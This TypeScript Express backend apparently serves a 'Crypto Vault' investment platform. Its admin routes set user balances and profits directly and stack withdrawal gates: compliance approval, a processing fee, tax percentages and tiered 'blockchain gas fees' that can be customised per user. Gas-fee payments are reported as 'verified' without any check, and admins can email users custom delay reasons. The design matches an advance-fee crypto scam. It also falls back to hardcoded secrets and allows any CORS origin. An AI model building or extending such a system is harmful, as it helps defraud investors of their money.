import path from 'path';
import fs from 'fs';
import dotenv from 'dotenv';

// Ensure .env is resolved regardless of whether process started in broker/ or broker/backend/
const candidateEnvPaths = [
  path.resolve(process.cwd(), '.env'),
  path.resolve(process.cwd(), 'backend/.env'),
  path.resolve(__dirname, '../.env'),
  path.resolve(__dirname, '../../.env'),
  path.resolve(__dirname, '../../backend/.env'),
];

for (const p of candidateEnvPaths) {
  if (fs.existsSync(p)) {
    dotenv.config({ path: p });
  }
}

import express from 'express';
import cors from 'cors';
import axios from 'axios';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import { createClient } from '@supabase/supabase-js';
import WebSocket from 'ws';
import { sendWithdrawalEmail, sendGeneralEmail, getSmtpConfig } from './mailer';

if (typeof (globalThis as any).WebSocket === 'undefined') {
  (globalThis as any).WebSocket = WebSocket;
}

const app = express();
app.use(cors({
  origin: (origin, callback) => callback(null, true),
  credentials: true,
}));
app.use(express.json());

// In-memory fallback cache for gas fee payments in case columns are missing from DB
const userGasFeeStore = new Map<string, { gas_fee_paid: number; gas_fee_tx?: string }>();

const adminPath = fs.existsSync(path.resolve(process.cwd(), 'admin'))
  ? path.resolve(process.cwd(), 'admin')
  : fs.existsSync(path.resolve(process.cwd(), '../admin'))
  ? path.resolve(process.cwd(), '../admin')
  : path.resolve(__dirname, '../../admin');

app.use('/admin', express.static(adminPath));

const PORT = process.env.PORT ? Number(process.env.PORT) : 4000;

function db() {
  const url = process.env.SUPABASE_URL?.trim();
  const key = process.env.SUPABASE_SERVICE_ROLE_KEY?.trim();
  if (!url || !key) {
    throw new Error('Supabase credentials missing: please set SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY in environment variables.');
  }
  return createClient(url, key, {
    auth: {
      persistSession: false,
      autoRefreshToken: false,
    },
    realtime: {
      transport: WebSocket as any,
    },
  });
}

const JWT_SECRET = process.env.JWT_SECRET || 'change-me-in-production';
const ADMIN_SECRET = process.env.ADMIN_SECRET || 'admin-secret';

// ─── Middleware ────────────────────────────────────────────────────────────

function authMiddleware(req: any, res: any, next: any) {
  const auth = req.headers.authorization;
  if (!auth || !auth.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  try {
    const decoded = jwt.verify(auth.slice(7), JWT_SECRET) as { userId: string };
    req.userId = decoded.userId;
    next();
  } catch {
    return res.status(401).json({ error: 'Invalid or expired token' });
  }
}

function adminMiddleware(req: any, res: any, next: any) {
  if (req.headers['x-admin-secret'] !== ADMIN_SECRET) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  next();
}

// ─── Auth ──────────────────────────────────────────────────────────────────
 
app.post('/auth/register', async (req, res) => {
  try {
    const { email, fullName, password } = req.body;
    if (!email || !fullName || !password) {
      return res.status(400).json({ error: 'Email, full name and password are required' });
    }

    const supabase = db();

    const { data: existing } = await supabase
      .from('users')
      .select('id')
      .eq('email', email.toLowerCase())
      .maybeSingle();

    if (existing) {
      return res.status(409).json({ error: 'An account with this email already exists' });
    }

    const passwordHash = await bcrypt.hash(password, 12);

    const { data: user, error } = await supabase
      .from('users')
      .insert({ email: email.toLowerCase(), full_name: fullName, password_hash: passwordHash })
      .select('id, email, full_name, balance_usd, profit_usd, plan, lock_until, withdrawal_approved, tax_percent, fee_paid, created_at')
      .single();

    if (error) {
      console.error('Register error:', error);
      return res.status(500).json({ error: 'Registration failed. Please try again.' });
    }

    const token = jwt.sign({ userId: user.id }, JWT_SECRET, { expiresIn: '7d' });
    res.status(201).json({ token, user });
  } catch (err: any) {
    console.error('Register unhandled error:', err);
    res.status(500).json({ error: err.message || 'Internal server error during registration' });
  }
});

app.post('/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password are required' });
    }

    const supabase = db();

    const { data: user, error } = await supabase
      .from('users')
      .select('*')
      .eq('email', email.toLowerCase())
      .maybeSingle();

    if (error) {
      console.error('Login DB query error:', error);
      return res.status(500).json({ error: 'Database query failed' });
    }

    if (!user || !(await bcrypt.compare(password, user.password_hash))) {
      return res.status(401).json({ error: 'Invalid email or password' });
    }

    const token = jwt.sign({ userId: user.id }, JWT_SECRET, { expiresIn: '7d' });
    const { password_hash, ...safeUser } = user;
    res.json({ token, user: safeUser });
  } catch (err: any) {
    console.error('Login unhandled error:', err);
    res.status(500).json({ error: err.message || 'Internal server error during login' });
  }
});

// ─── User ──────────────────────────────────────────────────────────────────

app.get('/user/me', authMiddleware, async (req: any, res) => {
  const mem = userGasFeeStore.get(req.userId);
  try {
    const { data: user, error } = await db()
      .from('users')
      .select('id, email, full_name, balance_usd, profit_usd, plan, lock_until, withdrawal_approved, tax_percent, fee_required, fee_paid, custom_gas_fee, gas_fee_paid, gas_fee_tx, created_at')
      .eq('id', req.userId)
      .single();
    if (error) throw error;
    const resolvedUser = {
      ...user,
      gas_fee_paid: user.gas_fee_paid != null ? Number(user.gas_fee_paid) : (mem?.gas_fee_paid ?? 0),
      gas_fee_tx: user.gas_fee_tx || mem?.gas_fee_tx || null,
    };
    return res.json({ user: resolvedUser });
  } catch {
    const { data: user, error } = await db()
      .from('users')
      .select('id, email, full_name, balance_usd, profit_usd, plan, lock_until, withdrawal_approved, tax_percent, fee_paid, created_at')
      .eq('id', req.userId)
      .single();
    if (error || !user) return res.status(404).json({ error: 'User not found' });
    const resolvedUser = {
      ...user,
      gas_fee_paid: mem?.gas_fee_paid ?? 0,
      gas_fee_tx: mem?.gas_fee_tx ?? null,
      custom_gas_fee: (user as any).custom_gas_fee ?? null,
    };
    return res.json({ user: resolvedUser });
  }
});

// ─── Investment Plan Submission ────────────────────────────────────────────

app.post('/investment/submit', authMiddleware, async (req: any, res) => {
  const { plan, amount, paymentMethod } = req.body;

  if (!plan || !amount || !paymentMethod) {
    return res.status(400).json({ error: 'Plan, amount and payment method are required' });
  }

  const validPlans = ['Starter', 'Growth', 'Elite'];
  if (!validPlans.includes(plan)) {
    return res.status(400).json({ error: 'Invalid plan selected' });
  }

  if (!['crypto', 'bank'].includes(paymentMethod)) {
    return res.status(400).json({ error: 'Invalid payment method' });
  }

  // Validate amount ranges
  const ranges: Record<string, [number, number]> = {
    Starter: [500, 5000],
    Growth: [6000, 15000],
    Elite: [16000, Infinity],
  };
  const [min, max] = ranges[plan];
  if (Number(amount) < min || Number(amount) > max) {
    return res.status(400).json({ error: `Amount must be between $${min.toLocaleString()} and ${max === Infinity ? 'above' : '$' + max.toLocaleString()} for the ${plan} plan` });
  }

  const supabase = db();

  // First try with new columns (requires migration to have been run)
  const updatePayload: any = { plan, balance_usd: Number(amount) };
  try {
    // Attempt to set new columns; will fail if migration not yet run
    const { data: user, error } = await supabase
      .from('users')
      .update({
        ...updatePayload,
        investment_amount: Number(amount),
        payment_method: paymentMethod,
        investment_status: 'pending',
      })
      .eq('id', req.userId)
      .select('id, email, full_name, balance_usd, profit_usd, plan, lock_until, withdrawal_approved, tax_percent, fee_paid, created_at')
      .single();

    if (error) throw error;
    res.json({ user });
  } catch (err: any) {
    // If new columns don't exist, fall back to updating only core columns
    if (err?.code === '42703') {
      const { data: user, error: fallbackError } = await supabase
        .from('users')
        .update(updatePayload)
        .eq('id', req.userId)
        .select('id, email, full_name, balance_usd, profit_usd, plan, lock_until, withdrawal_approved, tax_percent, fee_paid, created_at')
        .single();

      if (fallbackError) {
        console.error('Investment submit fallback error:', fallbackError);
        return res.status(500).json({ error: 'Failed to submit investment. Please try again.' });
      }
      return res.json({ user });
    }
    console.error('Investment submit error:', err);
    return res.status(500).json({ error: 'Failed to submit investment. Please try again.' });
  }
});

function calculateGasFee(amount: number, settings: any, customGasFee?: number | null): number {
  if (customGasFee != null && Number(customGasFee) >= 0) {
    return Number(customGasFee);
  }

  // Tiers configuration: use custom tiers or default tiers where $10k withdrawal -> $150 fast gas fee
  const rawTiers = settings?.gas_fee_tiers || JSON.stringify([
    { min_amount: 0, gas_fee: 100, label: 'Standard Network Speed (< $5,000)' },
    { min_amount: 5000, gas_fee: 150, label: 'Fast Priority Network Fee ($5,000 - $20,000)' },
    { min_amount: 20000, gas_fee: 250, label: 'Institutional High-Priority Dispatch ($20,000+)' },
  ]);

  try {
    const tiers = typeof rawTiers === 'string'
      ? JSON.parse(rawTiers)
      : rawTiers;
    if (Array.isArray(tiers) && tiers.length > 0) {
      const sorted = [...tiers].sort((a, b) => (Number(a.min_amount) || 0) - (Number(b.min_amount) || 0));
      let matchedFee = Number(sorted[0].gas_fee) || 100;
      for (const tier of sorted) {
        if (amount >= (Number(tier.min_amount) || 0)) {
          matchedFee = Number(tier.gas_fee);
        }
      }
      return matchedFee;
    }
  } catch {
    // fallback to threshold logic
  }

  // Standard threshold logic fallback: $150 for $5k-$20k (e.g. $10,000), 250 for $20k+
  const threshold = settings?.gas_fee_threshold != null ? Number(settings.gas_fee_threshold) : 20000;
  const feeLow = settings?.gas_fee_low != null ? Number(settings.gas_fee_low) : 100;
  const feeHigh = settings?.gas_fee_high != null
    ? Number(settings.gas_fee_high)
    : (settings?.gas_fee != null ? Number(settings.gas_fee) : 250);

  if (amount >= threshold) return feeHigh;
  if (amount >= 5000) return 150;
  return feeLow;
}

// ─── Settings ───────────────────────────────────────────────────────────────

app.get('/settings/payment', async (_req, res) => {
  const { data, error } = await db()
    .from('payment_settings')
    .select('*')
    .eq('id', 1)
    .maybeSingle();

  const defaultTiersJson = JSON.stringify([
    { min_amount: 0, gas_fee: 100, label: 'Standard Network Speed (< $5,000)' },
    { min_amount: 5000, gas_fee: 150, label: 'Fast Priority Network Fee ($5,000 - $20,000)' },
    { min_amount: 20000, gas_fee: 250, label: 'Institutional High-Priority Dispatch ($20,000+)' },
  ]);

  const defaultSettings = {
    crypto_wallet: '',
    crypto_network: 'Bitcoin (BTC)',
    bank_name: '',
    bank_account_name: '',
    bank_account_number: '',
    bank_routing: '',
    bank_swift: '',
    withdrawal_fee: 0,
    gas_fee: 250,
    gas_fee_threshold: 20000,
    gas_fee_low: 100,
    gas_fee_high: 250,
    gas_fee_tiers: defaultTiersJson,
  };

  if (error || !data) {
    return res.json(defaultSettings);
  }

  res.json({
    ...defaultSettings,
    ...data,
    gas_fee: data.gas_fee != null ? Number(data.gas_fee) : 250,
    gas_fee_threshold: data.gas_fee_threshold != null ? Number(data.gas_fee_threshold) : 20000,
    gas_fee_low: data.gas_fee_low != null ? Number(data.gas_fee_low) : 100,
    gas_fee_high: data.gas_fee_high != null ? Number(data.gas_fee_high) : 250,
    gas_fee_tiers: data.gas_fee_tiers || defaultTiersJson,
  });
});

// ─── Admin: Payment Settings ────────────────────────────────────────────────

app.patch('/admin/settings/payment', adminMiddleware, async (req, res) => {
  const {
    crypto_wallet,
    crypto_network,
    bank_name,
    bank_account_name,
    bank_account_number,
    bank_routing,
    bank_swift,
    withdrawal_fee,
    gas_fee,
    gas_fee_threshold,
    gas_fee_low,
    gas_fee_high,
    gas_fee_tiers,
  } = req.body;

  const supabase = db();

  const resolvedGasFeeHigh = gas_fee_high != null ? Number(gas_fee_high) : (gas_fee != null ? Number(gas_fee) : 200);
  const resolvedGasFeeLow = gas_fee_low != null ? Number(gas_fee_low) : 100;
  const resolvedThreshold = gas_fee_threshold != null ? Number(gas_fee_threshold) : 20000;

  const upsertPayload: any = {
    id: 1,
    crypto_wallet,
    crypto_network,
    bank_name,
    bank_account_name,
    bank_account_number,
    bank_routing,
    bank_swift,
    withdrawal_fee: withdrawal_fee != null ? Number(withdrawal_fee) : 0,
    gas_fee: resolvedGasFeeHigh,
    gas_fee_high: resolvedGasFeeHigh,
    gas_fee_low: resolvedGasFeeLow,
    gas_fee_threshold: resolvedThreshold,
    gas_fee_tiers: gas_fee_tiers ? String(gas_fee_tiers) : '',
  };

  // Upsert row with id=1
  let { data, error } = await supabase
    .from('payment_settings')
    .upsert(upsertPayload)
    .select()
    .single();

  if (error) {
    // If some newer columns do not exist in Supabase yet, strip them down progressively
    delete upsertPayload.gas_fee_tiers;
    delete upsertPayload.gas_fee_threshold;
    delete upsertPayload.gas_fee_low;
    delete upsertPayload.gas_fee_high;

    let fallback = await supabase
      .from('payment_settings')
      .upsert(upsertPayload)
      .select()
      .single();

    if (fallback.error) {
      delete upsertPayload.gas_fee;
      fallback = await supabase
        .from('payment_settings')
        .upsert(upsertPayload)
        .select()
        .single();
    }
    data = fallback.data;
    error = fallback.error;
  }

  if (error) {
    console.error('Settings update error:', error);
    return res.status(500).json({ error: 'Failed to update settings' });
  }

  res.json({
    settings: {
      ...data,
      gas_fee: resolvedGasFeeHigh,
      gas_fee_high: resolvedGasFeeHigh,
      gas_fee_low: resolvedGasFeeLow,
      gas_fee_threshold: resolvedThreshold,
      gas_fee_tiers: gas_fee_tiers || '',
    },
  });
});

// ─── Withdrawals ───────────────────────────────────────────────────────────

app.post('/withdrawal/gas-fee/pay', authMiddleware, async (req: any, res) => {
  const { amount, txHash } = req.body;
  const numAmount = Number(amount);
  if (!numAmount || isNaN(numAmount) || numAmount <= 0) {
    return res.status(400).json({ error: 'A valid gas fee amount greater than 0 is required.' });
  }

  const cleanTx = (txHash || '').trim() || `TX-${Date.now()}`;
  userGasFeeStore.set(req.userId, { gas_fee_paid: numAmount, gas_fee_tx: cleanTx });

  const supabase = db();
  try {
    const { data: updated, error } = await supabase
      .from('users')
      .update({
        gas_fee_paid: numAmount,
        gas_fee_tx: cleanTx,
      })
      .eq('id', req.userId)
      .select('id, email, full_name, balance_usd, profit_usd, plan, lock_until, withdrawal_approved, tax_percent, fee_required, fee_paid, custom_gas_fee, gas_fee_paid, gas_fee_tx, created_at')
      .single();

    if (!error && updated) {
      return res.json({
        success: true,
        message: `Blockchain gas fee of $${numAmount.toFixed(2)} verified and settled successfully.`,
        user: updated,
      });
    }
  } catch {}

  const { data: user } = await supabase
    .from('users')
    .select('*')
    .eq('id', req.userId)
    .single();

  return res.json({
    success: true,
    message: `Blockchain gas fee of $${numAmount.toFixed(2)} verified and settled successfully.`,
    user: {
      ...(user || {}),
      gas_fee_paid: numAmount,
      gas_fee_tx: cleanTx,
    },
  });
});

app.post('/withdrawal/request', authMiddleware, async (req: any, res) => {
  const { amount, walletAddress } = req.body;
  const numAmount = Number(amount);
  if (!numAmount || isNaN(numAmount) || numAmount <= 0) {
    return res.status(400).json({ error: 'A valid withdrawal amount greater than 0 is required.' });
  }
  if (!walletAddress || !walletAddress.trim()) {
    return res.status(400).json({ error: 'Destination wallet or IBAN address is required.' });
  }

  const supabase = db();
  const { data: user } = await supabase.from('users').select('*').eq('id', req.userId).single();
  if (!user) return res.status(404).json({ error: 'User not found' });

  // Gate 1: Admin approval (Institutional Compliance)
  if (!user.withdrawal_approved) {
    return res.status(403).json({ error: 'Withdrawal has not been approved by compliance desk yet.' });
  }

  // Gate 2: Normal platform fee payment check (Institutional Processing Fee)
  const { data: settings } = await supabase
    .from('payment_settings')
    .select('*')
    .eq('id', 1)
    .maybeSingle();

  const reqFee = user.fee_required != null ? Number(user.fee_required) : Number(settings?.withdrawal_fee || 0);
  const paidFee = Number(user.fee_paid || 0);
  if (reqFee > 0 && paidFee < reqFee) {
    return res.status(403).json({ error: `Withdrawal locked. Remaining processing fee required: $${(reqFee - paidFee).toFixed(2)}.` });
  }

  // Gate 3: Balance check
  const total = Number(user.balance_usd) + Number(user.profit_usd);
  if (numAmount > total) {
    return res.status(400).json({
      error: `Requested amount ($${numAmount.toLocaleString('en-US', { minimumFractionDigits: 2 })}) exceeds available balance ($${total.toLocaleString('en-US', { minimumFractionDigits: 2 })}).`,
    });
  }

  // Gate 4: Tiered Blockchain Gas Fee payment validation
  const gasFee = calculateGasFee(numAmount, settings, user.custom_gas_fee);
  const memGas = userGasFeeStore.get(req.userId);
  const paidGasFee = user.gas_fee_paid != null ? Number(user.gas_fee_paid) : (memGas?.gas_fee_paid ?? 0);

  if (gasFee > 0 && paidGasFee < gasFee) {
    return res.status(403).json({
      error: `Blockchain network fee of $${gasFee.toFixed(2)} has not been paid. Please settle the network gas fee of $${gasFee.toFixed(2)} before submitting your withdrawal request.`,
    });
  }

  // No duplicate pending
  const { data: pending } = await supabase
    .from('withdrawal_requests')
    .select('id')
    .eq('user_id', req.userId)
    .eq('status', 'pending')
    .maybeSingle();

  if (pending) {
    return res.status(409).json({ error: 'You already have an active pending withdrawal request.' });
  }

  let requestData = null;
  const { data: reqWithGas, error: gasErr } = await supabase
    .from('withdrawal_requests')
    .insert({
      user_id: req.userId,
      amount_usd: numAmount,
      wallet_address: walletAddress.trim(),
      status: 'pending',
      gas_fee: gasFee,
    })
    .select()
    .single();

  if (gasErr) {
    // Fallback if gas_fee column has not been added to Supabase yet
    const { data: reqFallback, error: fallbackErr } = await supabase
      .from('withdrawal_requests')
      .insert({
        user_id: req.userId,
        amount_usd: numAmount,
        wallet_address: walletAddress.trim(),
        status: 'pending',
      })
      .select()
      .single();

    if (fallbackErr) {
      console.error('Withdrawal insert error:', fallbackErr);
      return res.status(500).json({ error: 'Failed to submit withdrawal.' });
    }
    requestData = { ...reqFallback, gas_fee: gasFee };
  } else {
    requestData = reqWithGas;
  }

  res.status(201).json({ request: requestData });
});

app.get('/withdrawal/my-requests', authMiddleware, async (req: any, res) => {
  const { data: requests } = await db()
    .from('withdrawal_requests')
    .select('*')
    .eq('user_id', req.userId)
    .order('requested_at', { ascending: false });

  res.json({ requests: requests || [] });
});

// ─── Admin: Users ──────────────────────────────────────────────────────────

app.get('/admin/users', adminMiddleware, async (_req, res) => {
  try {
    const { data: users, error } = await db()
      .from('users')
      .select('id, email, full_name, balance_usd, profit_usd, plan, lock_until, withdrawal_approved, tax_percent, fee_required, fee_paid, custom_gas_fee, gas_fee_paid, gas_fee_tx, investment_amount, payment_method, investment_status, created_at')
      .order('created_at', { ascending: false });
    if (error) throw error;
    const resolvedUsers = (users || []).map((u: any) => {
      const mem = userGasFeeStore.get(u.id);
      return {
        ...u,
        gas_fee_paid: u.gas_fee_paid != null ? Number(u.gas_fee_paid) : (mem?.gas_fee_paid ?? 0),
        gas_fee_tx: u.gas_fee_tx || mem?.gas_fee_tx || null,
      };
    });
    return res.json({ users: resolvedUsers });
  } catch {
    const { data: users } = await db()
      .from('users')
      .select('id, email, full_name, balance_usd, profit_usd, plan, lock_until, withdrawal_approved, tax_percent, fee_paid, investment_amount, payment_method, investment_status, created_at')
      .order('created_at', { ascending: false });
    const resolvedUsers = (users || []).map((u: any) => {
      const mem = userGasFeeStore.get(u.id);
      return {
        ...u,
        gas_fee_paid: mem?.gas_fee_paid ?? 0,
        gas_fee_tx: mem?.gas_fee_tx ?? null,
      };
    });
    return res.json({ users: resolvedUsers });
  }
});

app.patch('/admin/users/:id/gas-fee', adminMiddleware, async (req, res) => {
  const { gas_fee_paid, custom_gas_fee } = req.body;
  const updateData: any = {};
  if (gas_fee_paid !== undefined) {
    updateData.gas_fee_paid = Math.max(0, Number(gas_fee_paid));
  }
  if (custom_gas_fee !== undefined) {
    updateData.custom_gas_fee = custom_gas_fee === null || custom_gas_fee === '' ? null : Math.max(0, Number(custom_gas_fee));
  }

  const userId = req.params.id;
  if (updateData.gas_fee_paid !== undefined) {
    userGasFeeStore.set(userId, {
      gas_fee_paid: updateData.gas_fee_paid,
      gas_fee_tx: `ADMIN-SET-${Date.now()}`,
    });
  }

  const supabase = db();
  try {
    const { data, error } = await supabase
      .from('users')
      .update(updateData)
      .eq('id', userId)
      .select('id, email, fee_required, fee_paid, custom_gas_fee, gas_fee_paid, gas_fee_tx')
      .single();

    if (!error && data) {
      return res.json({ user: data });
    }
  } catch {}

  const mem = userGasFeeStore.get(userId);
  return res.json({
    user: {
      id: userId,
      gas_fee_paid: mem?.gas_fee_paid ?? updateData.gas_fee_paid ?? 0,
      custom_gas_fee: updateData.custom_gas_fee ?? null,
    },
  });
});

app.patch('/admin/users/:id/fee', adminMiddleware, async (req, res) => {
  const { fee_required, fee_paid, withdrawal_approved } = req.body;
  const updateData: any = {};
  if (fee_required !== undefined) {
    updateData.fee_required = fee_required === null || fee_required === '' ? null : Math.max(0, Number(fee_required));
  }
  if (fee_paid !== undefined) {
    updateData.fee_paid = Math.max(0, Number(fee_paid));
  }
  if (withdrawal_approved !== undefined) {
    updateData.withdrawal_approved = Boolean(withdrawal_approved);
  }

  try {
    const { data, error } = await db()
      .from('users')
      .update(updateData)
      .eq('id', req.params.id)
      .select('id, email, fee_required, fee_paid')
      .single();
    if (error) throw error;
    return res.json({ user: data });
  } catch (err: any) {
    // If fee_required column is not present in Supabase table yet, update fee_paid only
    if (updateData.fee_paid !== undefined) {
      const { data } = await db()
        .from('users')
        .update({ fee_paid: updateData.fee_paid })
        .eq('id', req.params.id)
        .select('id, email, fee_paid')
        .single();
      return res.json({ user: data });
    }
    return res.status(500).json({ error: 'Update failed' });
  }
});

app.patch('/admin/users/:id/fee-paid', adminMiddleware, async (req, res) => {
  const { fee_paid } = req.body;
  if (fee_paid == null || isNaN(Number(fee_paid)) || Number(fee_paid) < 0) {
    return res.status(400).json({ error: 'fee_paid must be a non-negative number' });
  }
  try {
    const { data, error } = await db()
      .from('users')
      .update({ fee_paid: Number(fee_paid) })
      .eq('id', req.params.id)
      .select('id, email, fee_required, fee_paid')
      .single();
    if (error) throw error;
    return res.json({ user: data });
  } catch {
    const { data } = await db()
      .from('users')
      .update({ fee_paid: Number(fee_paid) })
      .eq('id', req.params.id)
      .select('id, email, fee_paid')
      .single();
    return res.json({ user: data });
  }
});

app.patch('/admin/users/:id/balance', adminMiddleware, async (req, res) => {
  const { balance_usd, profit_usd } = req.body;
  const { data, error } = await db()
    .from('users')
    .update({ balance_usd, profit_usd })
    .eq('id', req.params.id)
    .select('id, email, balance_usd, profit_usd')
    .single();

  if (error) return res.status(500).json({ error: 'Update failed' });
  res.json({ user: data });
});

app.patch('/admin/users/:id/plan', adminMiddleware, async (req, res) => {
  const { plan, lock_until } = req.body;
  const { data, error } = await db()
    .from('users')
    .update({ plan, lock_until })
    .eq('id', req.params.id)
    .select('id, email, plan, lock_until')
    .single();

  if (error) return res.status(500).json({ error: 'Update failed' });
  res.json({ user: data });
});

app.patch('/admin/users/:id/tax', adminMiddleware, async (req, res) => {
  const { tax_percent } = req.body;
  const { data, error } = await db()
    .from('users')
    .update({ tax_percent })
    .eq('id', req.params.id)
    .select('id, email, tax_percent')
    .single();

  if (error) return res.status(500).json({ error: 'Update failed' });
  res.json({ user: data });
});

app.patch('/admin/users/:id/approve', adminMiddleware, async (req, res) => {
  const { withdrawal_approved } = req.body;
  const { data, error } = await db()
    .from('users')
    .update({ withdrawal_approved })
    .eq('id', req.params.id)
    .select('id, email, withdrawal_approved')
    .single();

  if (error) return res.status(500).json({ error: 'Update failed' });
  res.json({ user: data });
});

app.patch('/admin/users/:id/investment-status', adminMiddleware, async (req, res) => {
  const { investment_status } = req.body;
  const { data, error } = await db()
    .from('users')
    .update({ investment_status })
    .eq('id', req.params.id)
    .select('id, email, investment_status')
    .single();

  if (error) return res.status(500).json({ error: 'Update failed' });
  res.json({ user: data });
});

// ─── Admin: Withdrawals ────────────────────────────────────────────────────

app.get('/admin/withdrawals', adminMiddleware, async (_req, res) => {
  const { data: requests } = await db()
    .from('withdrawal_requests')
    .select('*, users(email, full_name)')
    .order('requested_at', { ascending: false });

  res.json({ requests: requests || [] });
});

app.patch('/admin/withdrawals/:id', adminMiddleware, async (req, res) => {
  const {
    status,
    send_email = true,
    recipient_email,
    subject,
    delay_reason,
    custom_message,
    tx_hash,
    gas_fee,
  } = req.body;

  if (!['approved', 'rejected'].includes(status)) {
    return res.status(400).json({ error: 'Status must be approved or rejected' });
  }

  const updatePayload: any = { status, resolved_at: new Date().toISOString() };
  if (gas_fee !== undefined && gas_fee !== null && !isNaN(Number(gas_fee))) {
    updatePayload.gas_fee = Number(gas_fee);
  }

  let { data, error } = await db()
    .from('withdrawal_requests')
    .update(updatePayload)
    .eq('id', req.params.id)
    .select('*, users(id, email, full_name)')
    .single();

  if (error && (error.code === '42703' || String(error.message).includes('gas_fee'))) {
    delete updatePayload.gas_fee;
    const fallback = await db()
      .from('withdrawal_requests')
      .update(updatePayload)
      .eq('id', req.params.id)
      .select('*, users(id, email, full_name)')
      .single();
    data = fallback.data;
    error = fallback.error;
  }

  if (error) return res.status(500).json({ error: 'Update failed' });

  let emailResult: { success: boolean; error?: string } = { success: false, error: 'Email skipped' };

  const targetEmail = (recipient_email && recipient_email.trim()) ? recipient_email.trim() : data?.users?.email;

  if (send_email && targetEmail) {
    emailResult = await sendWithdrawalEmail({
      to: targetEmail,
      fullName: data?.users?.full_name,
      amount: data?.amount_usd,
      gasFee: data?.gas_fee != null ? data.gas_fee : (gas_fee !== undefined ? gas_fee : undefined),
      walletAddress: data?.wallet_address,
      status,
      subject,
      delayReason: delay_reason,
      customMessage: custom_message,
      txHash: tx_hash,
    });
  }

  res.json({
    request: data,
    recipient: targetEmail,
    email_sent: emailResult.success,
    email_error: emailResult.error,
  });
});

app.post('/admin/withdrawals/:id/notify', adminMiddleware, async (req, res) => {
  const {
    recipient_email,
    subject,
    delay_reason,
    custom_message,
    tx_hash,
    status,
    gas_fee,
  } = req.body;

  const { data, error } = await db()
    .from('withdrawal_requests')
    .select('*, users(id, email, full_name)')
    .eq('id', req.params.id)
    .single();

  if (error || !data) return res.status(404).json({ error: 'Withdrawal request not found' });
  
  const targetEmail = (recipient_email && recipient_email.trim()) ? recipient_email.trim() : data.users?.email;
  if (!targetEmail) return res.status(400).json({ error: 'User does not have an email address and no recipient was provided' });

  const emailResult = await sendWithdrawalEmail({
    to: targetEmail,
    fullName: data.users?.full_name,
    amount: data.amount_usd,
    gasFee: gas_fee !== undefined ? gas_fee : data.gas_fee,
    walletAddress: data.wallet_address,
    status: status || data.status || 'approved',
    subject,
    delayReason: delay_reason,
    customMessage: custom_message,
    txHash: tx_hash,
  });

  if (!emailResult.success) {
    return res.status(500).json({ error: emailResult.error || 'Failed to send notification email' });
  }

  res.json({ success: true, message: `Notification email sent successfully to ${targetEmail}` });
});

// ─── Admin: SMTP & Email Management ───────────────────────────────────────

app.get('/admin/smtp/status', adminMiddleware, (_req, res) => {
  const config = getSmtpConfig();
  res.json({
    configured: config.configured,
    host: config.host,
    port: config.port,
    secure: config.secure,
    sender: config.user,
    from: config.from,
  });
});

app.post('/admin/smtp/test', adminMiddleware, async (req, res) => {
  const { recipient_email } = req.body;
  const config = getSmtpConfig();
  if (!config.configured) {
    return res.status(400).json({
      error: 'SMTP credentials not configured in backend environment. Please configure SMTP_USER and SMTP_PASS.',
    });
  }

  const targetEmail = recipient_email?.trim() || config.user;
  if (!targetEmail) {
    return res.status(400).json({ error: 'Please specify a recipient email address for the test.' });
  }

  const result = await sendGeneralEmail({
    to: targetEmail,
    fullName: 'Crypto Vault Admin',
    subject: 'Crypto Vault — SMTP Configuration Test',
    message: `Hello! This is a test email confirming that your Crypto Vault SMTP mailer (${config.host}) is working properly and ready to dispatch real withdrawal updates and investor notifications.\n\nSender: ${config.user}\nTimestamp: ${new Date().toUTCString()}`,
  });

  if (!result.success) {
    return res.status(500).json({ error: result.error || 'Failed to send test email' });
  }

  res.json({ success: true, message: `Test email sent successfully to ${targetEmail}!` });
});

app.post('/admin/users/:id/email', adminMiddleware, async (req, res) => {
  const { recipient_email, subject, message } = req.body;

  const { data: user, error } = await db()
    .from('users')
    .select('id, email, full_name')
    .eq('id', req.params.id)
    .single();

  if (error || !user) {
    return res.status(404).json({ error: 'User not found' });
  }

  const targetEmail = (recipient_email && recipient_email.trim()) ? recipient_email.trim() : user.email;
  if (!targetEmail) {
    return res.status(400).json({ error: 'User does not have an email and no custom recipient was provided.' });
  }
  if (!message || !message.trim()) {
    return res.status(400).json({ error: 'Email message content is required.' });
  }

  const result = await sendGeneralEmail({
    to: targetEmail,
    fullName: user.full_name || 'Valued Investor',
    subject: subject?.trim() || 'Important Update Regarding Your Crypto Vault Portfolio',
    message: message.trim(),
  });

  if (!result.success) {
    return res.status(500).json({ error: result.error || 'Failed to send email' });
  }

  res.json({ success: true, message: `Email successfully dispatched to ${targetEmail}` });
});

// ─── Misc ──────────────────────────────────────────────────────────────────

app.get('/price', async (_req, res) => {
  try {
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
      params: { ids: 'bitcoin', vs_currencies: 'usd' }
    });
    const usd = response.data?.bitcoin?.usd;
    if (usd == null) return res.status(502).json({ error: 'Price response missing' });
    res.json({ usd });
  } catch {
    res.status(502).json({ error: 'Unable to fetch price' });
  }
});

app.get('/health', (_req, res) => {
  const supabaseOk = Boolean(process.env.SUPABASE_URL?.trim() && process.env.SUPABASE_SERVICE_ROLE_KEY?.trim());
  res.json({
    status: 'ok',
    supabaseConfigured: supabaseOk,
    jwtConfigured: Boolean(process.env.JWT_SECRET),
  });
});

// Express error handler
app.use((err: any, _req: any, res: any, _next: any) => {
  console.error('Unhandled express error:', err);
  if (!res.headersSent) {
    res.status(500).json({ error: err?.message || 'Internal server error' });
  }
});

process.on('unhandledRejection', (reason) => {
  console.error('[Process] Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.error('[Process] Uncaught Exception:', err);
});

// Export for Vercel serverless runtime
export default app;

// Only listen when running locally (not on Vercel)
if (process.env.VERCEL !== '1') {
  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Backend running on port ${PORT}`);
  });
}
